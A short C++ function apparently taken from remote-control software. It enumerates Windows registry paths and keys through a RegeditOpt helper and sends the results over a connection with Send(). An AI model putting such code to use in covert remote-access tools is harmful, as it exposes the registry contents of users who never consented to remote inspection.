void CRegManager::Find(char bToken, char *path)
{
	RegeditOpt  reg(bToken);
	if(path!=NULL){
        reg.SetPath(path);
	}
	char *tmp= reg.FindPath();
	if(tmp!=NULL){
		Send((LPBYTE)tmp, LocalSize(tmp));
		LocalFree(tmp);
	}
	char* tmpd=reg.FindKey();
	
    if(tmpd!=NULL){
		Send((LPBYTE)tmpd, LocalSize(tmpd));
		LocalFree(tmpd);
	}
}